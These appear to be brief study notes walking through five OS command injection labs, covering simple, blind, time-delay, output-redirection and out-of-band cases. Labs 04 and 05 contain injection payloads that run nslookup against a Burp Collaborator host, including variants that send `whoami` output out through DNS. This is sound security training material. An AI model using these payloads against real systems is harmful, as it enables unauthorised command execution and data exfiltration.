# Command Injection - Walkthroughs

```mermaid
graph TD
    Root["Command Injection"]
    Root --> L0["Lab 01"]
    click L0 href "#lab-01"
    Root --> L1["Lab 02"]
    click L1 href "#lab-02"
    Root --> L2["Lab 03"]
    click L2 href "#lab-03"
    Root --> L3["Lab 04"]
    click L3 href "#lab-04"
    Root --> L4["Lab 05"]
    click L4 href "#lab-05"
```

## Lab 01: OS command injection, simple case
<a id="lab-01"></a>

Target Goal - Exploit command injection to execute whoami command.

## Analysis



---

## Lab 02: Blind OS command injection with time delays
<a id="lab-02"></a>


Target Goal - Exploit blind command injection in the feedback function.


## Analysis



---

## Lab 03: Blind OS command injection with output redirection
<a id="lab-03"></a>

Target Goal - Exploit the blind command injection and redirect the output from the whoami command to the /var/www/images


## Analysis

1. Confirm blind command injection
- email field

2. Check where images are store

3. Redirect output to file

4. Check if file was created

 

---

## Lab 04: Blind OS command injection with out-of-band interaction
<a id="lab-04"></a>

Target Goal - Exploit blind OS command injection to issue a DNS lookup to Burp Collaborator

## Analysis

 & nslookup zorh37nyfzjbsg1nog7j9ml6zx5ntc.burpcollaborator.net #

---

## Lab 05: Blind OS command injection with out-of-band data exfiltration
<a id="lab-05"></a>

Target Goal - Exploit blind OS command injection to execute whoami command and exfiltrate output via DNS query to Burp collaborator.

## Analysis

& nslookup bt82fvhfm8v8bcfri5e1gp72itojc8.burpcollaborator.net #

& nslookup `whoami`.bt82fvhfm8v8bcfri5e1gp72itojc8.burpcollaborator.net #

& nslookup $(whoami).bt82fvhfm8v8bcfri5e1gp72itojc8.burpcollaborator.net #


---

